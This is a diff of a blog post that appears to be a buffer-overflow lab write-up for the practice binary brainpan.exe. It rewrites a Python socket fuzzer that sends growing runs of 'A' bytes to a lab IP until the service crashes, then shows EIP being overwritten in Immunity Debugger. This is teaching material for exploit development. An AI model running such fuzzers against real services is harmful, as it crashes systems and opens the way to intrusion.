@@ -184,41 +184,58 @@ Now we need to create a python script to test the input of the service:
 ```python
 #!/usr/bin/python
 
-################################################
-# FUZZING A REMOTE INPUT PARAMETER IN A SOCKET #
-################################################
-# Try input sizes until the program crash      #
-################################################
-
-import sys
 import socket
 import time
+import sys
 
-SIZE = 50
-IP = "192.168.74.131"
-PORT = 9999
+size = 100
+ip = "192.168.74.131"
+port = 9999
 
-while(SIZE < 2000):
+while(size < 1000):
     try:
-        print("\nSending input to buffer of ") % SIZE
-        inputBuffer = "A" * SIZE
+        print "\nInput buffer of %s bytes" % size
+        buffer = "A" * size
+
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((IP, PORT))
-        s.send(inputBuffer)
+
+        s.connect((ip,port))
+        s.send(buffer)
+
         s.close()
-        SIZE += 50
-        time.sleep(2)
+
+        size +=100
+        time.sleep(3)
+
     except:
-        print("\nThe socket service crashes")
+        print "\nService Crash !!!"
         sys.exit()
 ```
 
-At this point, we need to start the Inmunnity Debugger to study the behavior of the program.
+At this point, we need to start the Inmunnity Debugger to study the behavior of the program and attach the running proccess brainpan.exe:
 
+![placeholder](/assets/img/uploads/bufoverflow1/10.png "Large example image")
 
+The initial state of registers the following:
 
+![placeholder](/assets/img/uploads/bufoverflow1/11.png "Large example image")
+
+Run the python fuzzing script:
+
+![placeholder](/assets/img/uploads/bufoverflow1/12.png "Large example image")
+
+When the service receives a input of 600 bytes, it crashes:
+
+![placeholder](/assets/img/uploads/bufoverflow1/13.png "Large example image")
+
+And we can see that EIP was overwritten with the 41 = A characters that the script sent:
+
+![placeholder](/assets/img/uploads/bufoverflow1/14.png "Large example image")
 
 <br/>
+
+## CALCULATION OF EIP OFFSET
+
 <br/>
 <br/>
 <br/>
